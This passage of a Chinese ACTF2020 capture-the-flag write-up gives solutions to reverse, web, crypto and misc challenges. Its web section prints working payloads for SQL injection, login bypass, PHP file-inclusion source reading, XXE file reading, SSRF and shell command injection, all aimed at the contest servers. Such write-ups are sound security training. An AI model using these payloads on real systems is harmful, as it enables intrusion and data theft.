      && 5 * x10 + 23 * x9 + 122 * x8 + -19 * x7 + 99 * x6 + -117 * x5 + -69 * x3 + 22 * x2 - 98 * x1 + 10 * x4 == -2944
      && -54 * x10 + -23 * x8 + -82 * x3 + -85 * x1 + 124 * x2 - 11 * x4 - 8 * x5 - 60 * x6 + 95 * x7 + 100 * x9 == -2222
      && -83 * x10 + -111 * x6 + -57 * x1 + 41 * x2 + 73 * x3 - 18 * x4 + 26 * x5 + 16 * x7 + 77 * x8 - 63 * x9 == -13258
      && 81 * x10 + -48 * x9 + 66 * x8 + -104 * x7 + -121 * x6 + 95 * x5 + 85 * x4 + 60 * x3 + -85 * x1 + 80 * x2 == -1559
      && 101 * x10 + -85 * x9 + 7 * x7 + 117 * x6 + -83 * x5 + -101 * x4 + 90 * x3 + -28 * x2 + 18 * x1 - x8 == 6308 )
    {
      result = 99 * x10 + -28 * x9 + 5 * x8 + 93 * x7 + -18 * x6 + -127 * x5 + 6 * x4 + -9 * x3 + -93 * x2 + 58 * x1 == -1697;
    }
  }
  return result;
}
```

提取出十个方程，用`python`解方程即可，这里比较坑的是出题人把`x6`和`x7`的顺序换了一下，不仔细看的话，会把这两个变量搞反。。。我就搞反了，debug的时候第一个方程总是解不对，曾一度怀疑是c语言运算出问题了。。。。（出题人，你过来，我不打你。嗯？哪里跑！）

```python
#!/usr/bin/python
#__author__:TaQini

import sympy

x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,x10 = sympy.symbols("x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10")

b = sympy.solve(
    [-85*x9+58*x8+97*x7+x6+-45*x5+84*x4+95*x1-20*x2+12*x3-12613,
    30*x10+-70*x9+-122*x7+-81*x6+-66*x5+-115*x4+-41*x3+-86*x2-15*x1-30*x8+54400,
    -103*x10+120*x8+108*x6+48*x4+-89*x3+78*x2-41*x1+31*x5-(x7*64)-120*x9+10283,
    71*x7+(x6*128)+99*x5+-111*x3+85*x2+79*x1-30*x4-119*x8+48*x9-16*x10-22855,
    5*x10+23*x9+122*x8+-19*x7+99*x6+-117*x5+-69*x3+22*x2-98*x1+10*x4+2944,
    -54*x10+-23*x8+-82*x3+-85*x1+124*x2-11*x4-8*x5-60*x6+95*x7+100*x9+2222,
    -83*x10+-111*x6+-57*x1+41*x2+73*x3-18*x4+26*x5+16*x7+77*x8-63*x9+13258,
    81*x10+-48*x9+66*x8+-104*x7+-121*x6+95*x5+85*x4+60*x3+-85*x1+80*x2+1559,
    101*x10+-85*x9+7*x7+117*x6+-83*x5+-101*x4+90*x3+-28*x2+18*x1-x8-6308,
    99*x10+-28*x9+5*x8+93*x7+-18*x6+-127*x5+6*x4+-9*x3+-93*x2+58*x1+1697],
    [x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x0]    
)
print dict(b)

d = {"x3": 117, "x7": 95, "x10": 64, "x9": 119, "x2": 48, "x6": 121, "x4": 82, "x1": 70, "x8": 55, "x5": 84}

part1 = chr(d["x1"])+chr(d["x2"])+chr(d["x3"])+chr(d["x4"])+chr(d["x5"])+chr(d["x6"])+chr(d["x7"])+chr(d["x8"])+chr(d["x9"])+chr(d["x10"])
# print hex(d["x1"]),hex(d["x2"]),hex(d["x3"]),hex(d["x4"]),hex(d["x5"]),hex(d["x6"]),hex(d["x7"]),hex(d["x8"]),hex(d["x9"]),hex(d["x10"])
part2 = 9
for i in d:
	part2 ^= d[i]
part2 = str(part2)

print "actf{%s_%s}"%(part1,part2)
```

> p.s.这题其实给9个方程就可以做，因为变量必然是Ascii。



------

# Web

## universal_sql

- 题目描述：你听说过万能密码？？
- 考察点：sql注入
- 难度：入门
- 分值：100
- 完成人数：11

查看源代码，有个`index.txt`，里面是源码：

```php
$username = $_POST[username];
$passwd = md5($_POST[passwd]);
$sql = "select username from users where (username='$username') and (pw='$passwd')";
```

构造`sql`语句，注释掉查询`pw`的部分：

```mysql
select username from users where (username='admin')#') and (pw='$passwd')";
```

用户名是`admin`时显示登录成功：

![burp](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/universal_sql/1.png)



## 茶颜悦色

- 题目描述：茶颜！快来排队叭！
- 考察点：py脚本
- 难度：简单
- 分值：100
- 完成人数：9

网站链接都是假的...只有翻页能点...查看源码有提示：

```html
<!--找一找我最喜欢喝的幽兰拿铁!-->
```

于是写脚本自动翻页：

```python
#!/usr/bin/python3
#__author__:TaQini
import requests

# header
s=requests.session()                                     
s.headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
s.headers['Accept-Encoding']='gzip, deflate, br'
s.headers['Host']='url'                 
s.headers['Accept-Language']='zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,ko;q=0.6'
s.headers['User-Agent']='zilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'

url = 'http://47.106.94.13:40004'

# get
def get_data(i):                          
    res = s.get(url,params={'page':str(i)})
    res.encoding = res.apparent_encoding
    return res.text 

i=0
while True:
    print('page %d'%i)
    t = get_data(i)
    i+=1
    if '幽兰拿铁' in t[1000:]:
        print(t[1000:])
        break
```

找到拿铁就给`flag`啦：

![cy](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/chayan/cy.png)



## babysql

- 题目描述：-
- 考察点：sql注入
- 难度：简单
- 分值：200
- 完成人数：10

简单的sql注入

![sqlpage](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/babysql/sql_page.png)

根据输入的id查询用户名和密码

`id=-1' order by 1,2,3,4 #`时回显消失，所以一共是就3列数据

然后删除线那里给了表名，直接`union select`就能拿到`flag`，payload:

> `id=-1' union select 1,flag,3 from flag #`

![sql](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/babysql/sql.png)



## whats git

- 题目描述：-
- 考察点：githack
- 难度：入门
- 分值：200
- 完成人数：6

`Githack`，然后找`flag`


```shell
% find ./ | grep flag 
./新建文件夹 - 副本 (7)/新建文件夹 - 副本 (3)/新建文件夹 - 副本 (4)/新建文件夹 - 副本 (3)/flag

% cat "./新建文件夹 - 副本 (7)/新建文件夹 - 副本 (3)/新建文件夹 - 副本 (4)/新建文件夹 - 副本 (3)/flag"
ACTF{.git_leak_is_dangerous}%                                                       
```



## backup_file

- 题目描述：-
- 考察点：bak文件、php弱类型
- 难度：简单
- 分值：200
- 完成人数：8

提示`Try to find out source file!`，于是扫一下目录发现`index.php.bak`:

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```
`$key == $str`时给`flag`，`key`必须是数字，而`str`是字符串

由于php弱类型，`str`在比较时`"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"=123`

所以让`key=123`即可绕过比较

payload:

>  http://106.15.207.47:21001/?key=123



## easy_file_include

- 题目描述：-
- 考察点：php文件包含
- 难度：简单
- 分值：200
- 完成人数：7

首先不会，于是[查资料](https://www.jianshu.com/p/6af8e76d22a5)<-拿这个payload试了下可以用：

> http://106.15.207.47:21002/?file=php://filter/read=convert.base64-encode/resource=./index.php

得到源码：

```php
<meta charset="utf8">
<?php
error_reporting(0);
$file = $_GET["file"];
if(stristr($file,"php://input") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")){
	exit('hacker!');
}
if($file){
	include($file);
}else{
	echo '<a href="?file=flag.php">tips</a>';
}
?>
```

好像并没有什么用，直接读`flag.php`发现flag就在注释里...payload如下：

> http://106.15.207.47:21002/?file=php://filter/read=convert.base64-encode/resource=./flag.php

```php
<?php
echo "Can you find out the flag?";
//ACTF{Fi1e_InClUdE_Is_EaSy}
```



## easyHTTP

- 题目描述：-
- 考察点：HTTP协议
- 难度：入门
- 分值：200
- 完成人数：9

题目界面：

<img src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/1b.png" alt="1b" style="zoom:38%;" />

将对应的信息填好，提交后在`header`中给出下一个`php`的位置：

![b1](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/1.png)

访问之：

<img src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/2b.png" alt="2b" style="zoom:38%;" />

按照要求发送参数，然后在`header`中又给出下一个`php`的位置：

![b2](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/2.png)

访问之：

<img src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/3b.png" alt="3b" style="zoom:38%;" />

按照要求发送`cookie`，然后在`header`中又给出下一个`php`的位置：

![b3](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/3.png)

访问之：
<img src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/4b.png" alt="4b" style="zoom:38%;" />

按照要求`XFF`，最终拿到flag：

![b4](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/4.png)



## easyphp

- 题目描述：-
- 考察点：代码审计、md5绕过
- 难度：简单
- 分值：200
- 完成人数：9

```php
 <?php
error_reporting(0);
include_once "flag.php";
show_source(__FILE__);

session_start();

if(!isset($_POST['key'])) {
    die("not allow!");
}

if($_POST['key'] != $_SESSION['key']) {
    die("Wrong key!");
}

if(isset($_GET['username']) && isset($_GET['password'])) {
    if($_GET['username'] == $_GET['password']) {
        die("Your password can not be your username!");
    }
    if(md5($_GET['username']) === md5($_GET['password'])) {
        echo $flag;
    }
} 
```

`$_SESSION['key']`中并没有值，所以`$_POST['key']`传空值可绕过

查了下，md5可以通过数组绕过：

> 传入`md5`函数的参数为数组类型时返回`null`

只要向`username`和`password`中传两个不同的数组，数组经过md5后`null===null`即可绕过md5检查

![burpa](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyphp/1.png)



## 幸运数字

- 题目描述：快来挑选你的幸运数字吧~
- 考察点：爆破、XXE
- 难度：中等
- 分值：200
- 完成人数：6

幸运数5位数，burp爆破得到`77777`，给了tips:

![x1](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/lucky_num/xxe1.png)

post的数据在`<licky_number>`这个标签中，由此想到可以注入，刚开始以为是XSS，查了半天也不知道怎么读文件，后来醒过神儿来，这部是XML么，百度了一下，原来是XXE... 

payload：

> ```xml
> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
> <lucky_number>77777 and flag is &xxe;</lucky_number>
> ```

![x2](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/lucky_num//xxe2.png)



## easyweb

- 题目描述：这真不是考密码学....
- 考察点：curl?
- 难度：简单
- 分值：200
- 完成人数：9

查看源码，给了hint：

```html
<!--Nzc3Nzc3MmU2MjYxNmI=heiheihei-->
```

解base64，再解hex，得到`www.bak`

```python
In [1]: s='Nzc3Nzc3MmU2MjYxNmI='

In [2]: s.decode('base64')
Out[2]: '7777772e62616b'

In [3]: '7777772e62616b'.decode('hex')
Out[3]: 'www.bak'
```

下载下来，发现是个zip，解压后给了flag位置（`/flag`）和源码：

```php+HTML
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>找找hint吧</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<p>这里什么也没有噢！</p>
<!--Nzc3Nzc3MmU2MjYxNmI=heiheihei-->
</body>
<?php
//学习一下如何利用下面的代码?
//请不要用来做"越界"的操作
error_reporting(0);
function curl($url){  
    // 创建一个新cURL资源
    $ch = curl_init();
    // 设置URL和相应的选项
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    // 抓取URL并把它传递给浏览器
    curl_exec($ch);
    // 关闭cURL资源，并且释放系统资源
    curl_close($ch);
}

$url = $_GET['url'];
curl($url); 
?>
</html>
```

有一个`curl($url)`函数，试了下跟linux的`curl`命令差不多，功能就是访问目标`url`

![baidu](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyweb/curl.png)

直接访问服务器本地的`/flag`即可

![urla](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyweb/easyweb.png)



## simlple_exec

- 题目描述：-
- 考察点：命令执行、shell基础
- 难度：入门
- 分值：300
- 完成人数：9

![cataa](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/simlple_exec/1.png)

点ping按钮会执行ping命令，应该是用了system函数，于是试了一下末尾加上`;cmd`执行命令

> 127.0.0.1;ls
> 127.0.0.1;cat index.php 

```php
<?php
if (isset($_POST['target'])) {
	system("ping -c 3 ".$_POST['target']);
}
?>
```
什么过滤都没有，直接读flag即可：

> 127.0.0.1;cat /flag*



------

# Crypto

密码学从入门到放弃

## classic0

- 题目描述：

  > 小Z用C语言编写了一个最简单的密码系统，里面都采用的是最简单的古典加密。但是他的源程序不幸泄露，聪明的你能否解读他采用的算法并进行解密？flag格式为actf{***}

- 题目地址：[crypto-classic0.zip](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic0/crypto-classic0.zip)

- 考察点：逆向分析

- 难度：入门

- 分值：100

- 完成人数：11

提示密码是生日，于是暴力解压缩包密码，得到`19990306`，解压出加密程序的代码：

```c
#include<stdio.h>

char flag[25] = ***

int main()
{
	int i;
	for(i=0;i<25;i++)
	{
		flag[i] -= 3;
		flag[i] ^= 0x7;
		printf("%c",flag[i]);
	}
	return 0; 
}
```

不难，直接解密即可：

```python
f=open('./cipher','r')
s=f.read()
f.close()
k=''
for i in s:
    k+=chr((ord(i)^0x7)+3)
print k
# 'actf{my_naive_encrytion}'
```



## classic1

- 题目描述：维吉尼亚加密是极其经典的古典密码，flag格式为actf{}，明文中的字母均为小写。
- 题目地址：[crypto-classic1](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1/crypto-classic1.zip)
- 考察点：维吉尼亚加密
- 难度：中等
- 分值：100
- 完成人数：8

压缩包有密码，不过给了提示：

> 哇，这里有压缩包的密码哦，于是我低下了头，看向了我的双手，试图从中找到某些规律
> xdfv ujko98 edft54 xdfv pok,.; wsdr43

我低头看了看键盘，照着提示按下一个个按键，意外地发现，我在键盘上画了6个〇

然鹅并不知道密码是啥`=_=`但是应该是六位，于是暴力破解，解出密码`circle`这谁猜得出a...

解开名为维吉尼亚的压缩包发现密文：

>  SRLU{LZPL_S_UASHKXUPD_NXYTFTJT}

查了查维吉尼亚，发现和凯撒差不多，也是rot，但是多了一个密钥，网上有无密钥的解法，但是好高端，各种数学公式，看不懂啊...

> 维吉尼亚密码的密钥长度需要与明文长度相同，如果少于明文长度，则重复拼接直到相同

于是遍历一边密钥只有一个字符(a-z)的加密结果，看看能有啥眉头不

```python
In [1]: s='SRLU{LZPL_S_UASHKXUPD_NXYTFTJT}'

In [2]: import string

In [9]: for i in range(26):
   ...:     t=''
   ...:     for j in s:
   ...:         if j in string.uppercase:
   ...:             t+=chr(((ord(j)-ord('A')+i)%26)+ord('A'))
   ...:         else:
   ...:             t+=j
   ...:     print chr(ord('A')+i),t
   ...:        

A SRLU{LZPL_S_UASHKXUPD_NXYTFTJT}
B TSMV{MAQM_T_VBTILYVQE_OYZUGUKU}
C UTNW{NBRN_U_WCUJMZWRF_PZAVHVLV}
D VUOX{OCSO_V_XDVKNAXSG_QABWIWMW}
E WVPY{PDTP_W_YEWLOBYTH_RBCXJXNX}
F XWQZ{QEUQ_X_ZFXMPCZUI_SCDYKYOY}
G YXRA{RFVR_Y_AGYNQDAVJ_TDEZLZPZ}
H ZYSB{SGWS_Z_BHZOREBWK_UEFAMAQA}
I AZTC{THXT_A_CIAPSFCXL_VFGBNBRB}
J BAUD{UIYU_B_DJBQTGDYM_WGHCOCSC}
K CBVE{VJZV_C_EKCRUHEZN_XHIDPDTD}
L DCWF{WKAW_D_FLDSVIFAO_YIJEQEUE}
M EDXG{XLBX_E_GMETWJGBP_ZJKFRFVF}
N FEYH{YMCY_F_HNFUXKHCQ_AKLGSGWG}
O GFZI{ZNDZ_G_IOGVYLIDR_BLMHTHXH}
P HGAJ{AOEA_H_JPHWZMJES_CMNIUIYI}
Q IHBK{BPFB_I_KQIXANKFT_DNOJVJZJ}
R JICL{CQGC_J_LRJYBOLGU_EOPKWKAK}
S KJDM{DRHD_K_MSKZCPMHV_FPQLXLBL}
T LKEN{ESIE_L_NTLADQNIW_GQRMYMCM}
U MLFO{FTJF_M_OUMBEROJX_HRSNZNDN}
V NMGP{GUKG_N_PVNCFSPKY_ISTOAOEO}
W ONHQ{HVLH_O_QWODGTQLZ_JTUPBPFP}
X POIR{IWMI_P_RXPEHURMA_KUVQCQGQ}
Y QPJS{JXNJ_Q_SYQFIVSNB_LVWRDRHR}
Z RQKT{KYOK_R_TZRGJWTOC_MWXSESIS}
```

果然，当密钥是`I`的时候，字符串被加密成:

> AZTC{THXT_A_CIAPSFCXL_VFGBNBRB}

隐隐能猜到`ACTF`,`VIGENERE`这两个单词
对比`ACTF`和`AZTC`，第2和第四位不同，但是`Z+3=C`，`C+3=F`，于是猜测密钥第二位应该是`I+3=L`
再看一下密钥是纯`L`的加密结果:

>  DCWF{WKAW_D_FLDSVIFAO_YIJEQEUE}

于是验证了上述想法

> I AZTC{THXT_A_CIAPSFCXL_VFGBNBRB}
> L DCWF{WKAW_D_FLDSVIFAO_YIJEQEUE}

由于开头的`ACTF`和末位的`VIGENERE`都是隔一个字符就正确一个，于是猜测密钥只含`I`和`L`

从上面那两个结果能凑齐FLAG了

![jie](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1/jie2.png)

最后逐个凑了一下密钥，结果是：

> ililliliiililililiilil

按理说应该是解密的，但是用这个密钥加密题目给的字符串就能出FLAG
至于为什么，我也不知道，可能因为加密解密是对称的？

![ans](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1//Picture1.png)



## rsa0

- 题目描述：看看rsa的资料，学学python吧，这种简单题绝对不卡你！flag格式为`actf{***}`
- 题目地址：[crypto-rsa0.zip](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-rsa0/crypto-rsa0.zip)
- 考察点：zip伪加密、RSA
- 难度：入门
- 分值：100
- 完成人数：6

### 伪加密

将`rsa0.py` 文件对应的`0009` 改为 `0000`

得到`e=65537`

### rsa解密

```python
#!/usr/bin/python
#__author__:TaQini

import gmpy2
from Crypto.Util import number

p = 9018588066434206377240277162476739271386240173088676526295315163990968347022922841299128274551482926490908399237153883494964743436193853978459947060210411

q = 7547005673877738257835729760037765213340036696350766324229143613179932145122130685778504062410137043635958208805698698169847293520149572605026492751740223

c = 50996206925961019415256003394743594106061473865032792073035954925875056079762626648452348856255575840166640519334862690063949316515750256545937498213476286637455803452890781264446030732369871044870359838568618176586206041055000297981733272816089806014400846392307742065559331874972274844992047849472203390350

e = 65537

d = gmpy2.invert(e, (p-1)*(q-1))

m = pow(c, d, p*q)

print( number.long_to_bytes(m) )

```



## baby aes

- 题目描述：

  > AES是一种十分高效安全的对称加密方式，在现代密码学中有着举足轻重的地位。小Z对此很放心，于是就写了一个脚本用AES加密，你能获得他的明文嘛？flag格式为`actf{***}`

- 题目地址：[crypto-aes.zip](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-aes/crypto-aes.zip)

- 考察点：数学? AES加密

- 难度：简单

- 分值：200

- 完成人数：2

`key`长32字节为两字节的随机数重复16次，`iv`长16字节

已知：输出`out`，`key`与`iv`异或的结果

由于`key`与`iv`长度不一样，`key`有16字节字节与0异或，还是其本身，因此可解出`key`

由异或结果可解出`iv`

解出`iv`后，直接`aes`解密即可

```python
#!/usr/bin/python3
#__author__:TaQini

from Crypto.Cipher import AES
import os
import gmpy2
from Crypto.Util.number import *

out = long_to_bytes(91144196586662942563895769614300232343026691029427747065707381728622849079757)

key = out[:16]*2

xor_res = out[16:]

iv = bytes_to_long(xor_res)^bytes_to_long(key[16:])
iv = long_to_bytes(iv)

aes=AES.new(key,AES.MODE_CBC,iv)

out = b'\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&\xd6\x91\xfe\xf3\x14\x10|\xf8p'

flag = aes.decrypt(out)

print(flag)
```

------

# Misc

签到题都没做出来，呜呜呜

## 白给

- 题目描述：远在天边，近在眼前。仔细找找吧~

- 考察点：base64隐写术
- 难度：简单
- 分值：100
- 完成人数：12

base64隐写...直接跑脚本解密

```shell
% ./base64decode.py ./ComeOn\!.txt
...
ACTF{6aseb4_f33!}
```

```python
#!/usr/bin/python
import sys

def get_base64_diff_value(s1, s2):
    base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    res = 0
    for i in xrange(len(s2)):
        if s1[i] != s2[i]:
            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))
    return res

def solve_stego():
    with open(sys.argv[1], 'rb') as f:
        file_lines = f.readlines()
        bin_str = ''
        for line in file_lines:
            steg_line = line.replace('\n', '')
            norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n', '')
            diff = get_base64_diff_value(steg_line, norm_line)
            print diff
            pads_num = steg_line.count('=')
            if diff:
                bin_str += bin(diff)[2:].zfill(pads_num * 2)
            else:
                bin_str += '0' * pads_num * 2
            print goflag(bin_str)


def goflag(bin_str):
    res_str = ''
    for i in xrange(0, len(bin_str), 8):
        res_str += chr(int(bin_str[i:i + 8], 2))
    return res_str


if __name__ == '__main__':
    solve_stego()

```



## Music for free

- 题目描述：

  > zzw喜欢听音乐，可是他不是VIP，也不想花钱下载音乐，可是你却在无意中发现了他拥有大量的音乐资源。想想他是怎么做到的？
  > 格式为：actf{xxxxxx}，flag均是小写

- 考察点：文件修复

- 难度：简单

- 分值：100

- 完成人数：5

给了一个`m4a`文件但是用`file`没识别出来

```shell
% file vip.m4a 
vip.m4a: data
```

于是查了一下`m4a` 文件头是：

> `00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00`

而这个文件的文件头却是：

> `a1 a1 a1 b9 c7 d5 d8 d1 cc d1 95 93 a1 a1 a1 a1`

应该是和`0xa1`异或了，解出来`m4a`然后播放，原来是道听力题.....

![m4a](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/music/m4a.png)



## SWP

- 题目描述：

  > 简单的流量题。
  > 格式为：actf{xxxxxx}，flag均是小写

- 考察点：流量分析

- 难度：简单

- 分值：100

- 完成人数：8

用`wireshark`打开流量包，搜索`flag`发现压缩包一个

![swp](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/swp/swp.png)

尝试解压，发现有密码，但是直接用`binwalk`就能解出来`flag`文件

是个`elf64`，直接搜索字符串就有flag

```shell
% rabin2 -zz flag| grep {
17  0x000006d9 0x000006d9 42  43 ascii  actf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}
```

并不知道这题给的swp文件有啥用...



## 喵咪

- 题目描述：好可爱的小猫咪！
- 考察点：outguess隐写术
- 难度：入门
- 分值：200
- 完成人数：7

根据提示百度了下，是outguess加密，直接解密的话报错了，看来是需要key

windows下查看图片属性，备注里有着**社会主义核心价值观**，送去[这里](http://ctf.ssleye.com/cvencode.html)解码，解得`abc`

用key解密即可：

```shell
% ./outguess -r mmm.jpg -k abc -t a.txt ; cat a.txt
Reading mmm.jpg....
Extracting usable bits:   17550 bits
Steg retrieve: seed: 93, len: 23
ACTF{gue33_Gu3Ss!2020}
```



## Login

- 题目描述：

  > 假装自己是一个web题目。
  >
  > 做完这题以后请正确加密。
  >
  > 格式为：afctf{xxxxxx}

- 考察点：流量分析、AES加密

- 难度：简单

- 分值：200

- 完成人数：4

流量分析，能提取出`login.html`的网页源码

```html
<!DOCTYPE html>
<html lang="en">
    
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
        <title>Login</title>
    </head>
    
    <body>
         <h1>Login</h1>

        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
        <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8=" crossorigin="anonymous"></script>
        <script>
            const key = CryptoJS.enc.Utf8.parse("1234123412ABCDEF");
            const iv = CryptoJS.enc.Utf8.parse('ABCDEF1234123412');

            function checkform_login() {
                if ($("#username").val() == "") {
                    $("#username").focus();
                    alert("请输入您的账号！")
                    return false

                } else if ($("#password").val() == "") {
                    $("#password").focus();
                    alert("请输入您的密码！")
                    return false

                } else {

                    $("#u_dlcode").val(Encrypt($("#username").val()))
                    $("#p_dlcode").val(Encrypt($("#password").val()))

                    $("#form_login_true").submit();
                    return true
                }
            }



            //加密方法
            function Encrypt(word) {
                let srcs = CryptoJS.enc.Utf8.parse(word);
                let encrypted = CryptoJS.AES.encrypt(srcs, key, {
                    iv: iv,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });
                return encrypted.ciphertext.toString().toUpperCase();
            }
        </script>
        <form id="form_login" name="form_login" action="javascript:;" method="post">
            <input name="username" id="username" type="text" maxlength="20" hidefocus="true" />
            <input name="password" id="password" type="password" hidefocus="true" />
            </td>
            <input type="button" name="Submit" id="dlbutton" value="登录系统" onclick="checkform_login()" />
        </form>
        <!--用户输入完成后，真实POST提交的表单 -->
        <form id="form_login_true" name="form_login_true" action="index.html" method="post">
            <input name="u_dlcode" id="u_dlcode" type="hidden" value="" />
            <input name="p_dlcode" id="p_dlcode" type="hidden" value="" />
        </form>
    </body>

</html>
```

用户名和密码经AES加密后提交给表单，加密后的用户名为`u_dlcode`，密码为`p_dlcode`，分别能在下一个包中找到：

> key = 1234123412ABCDEF
>
> iv = ABCDEF1234123412
>
> u_dlcode = F6889AA527EA40FB0A2AECC5A28A694E
>
> p_dlcode = 0D2FD588668054DA021349541E5CB64F55979D02E41C75E0CE0233F6D10E31251B40CB8E197404F9E261FBA573E09191
>
> mode: CBC
> padding: Pkcs7

在这里[解密](http://tool.chacuo.net/cryptaes)，得到用户名为`admin`，密码即为flag：

![login](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/login/login.png)

------

# end

感谢承办单位中南大学[极光网络安全实验室](http://www.csuaurora.org/) 

感谢以及各位出题、验题的师傅们的付出，很不错的比赛，为寒假宅在家的我增添了不少乐趣~

祝ACTF越办越好~
